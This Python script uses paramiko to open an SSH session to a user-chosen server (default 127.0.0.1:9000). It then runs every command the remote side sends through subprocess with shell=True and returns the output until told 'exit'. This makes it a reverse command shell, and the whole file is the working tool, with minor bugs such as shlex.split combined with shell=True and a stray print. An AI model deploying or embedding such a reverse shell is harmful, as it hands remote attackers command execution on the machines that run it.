import getpass
import paramiko
import shlex
import subprocess

CLIENT_CONNECTED = "ClientConnected"

DATA_LEN = 1024

DEFAULT_IP = "127.0.0.1"

DEFAULT_PORT = 9000

def	ssh_command(ip, port, user, passwd, command):
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(hostname=ip, port=port, username=user, password=passwd)

	ssh_session = client.get_transport().open_session()
	if ssh_session.active:
		cmd_size = len(command)
		res = ssh_session.send(command)
		if cmd_size != res:
			print("[!!] some data not send!")
		
		print(ssh_session.recv(DATA_LEN).decode())
		while True:
			command = ssh_session.recv(DATA_LEN)
			try:
				cmd = command.decode()
				if cmd == "exit":
					client.close()
					break
				cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
				ssh_session.send(cmd_output or "okay")
			except Exception as e:
				ssh_session.send(str(e))
		client.close()
		return

if __name__ == "__main__":
	# user = getpass.getuser()
	user = input("Enter ssh user: ")
	passwd = getpass.getpass()
	ip = input("Enter servr IP: ") or DEFAULT_IP
	port = input("Enter port: ") or DEFAULT_PORT
	print("user")
	ssh_command(ip=ip, port=port, user=user, passwd=passwd, command=CLIENT_CONNECTED)
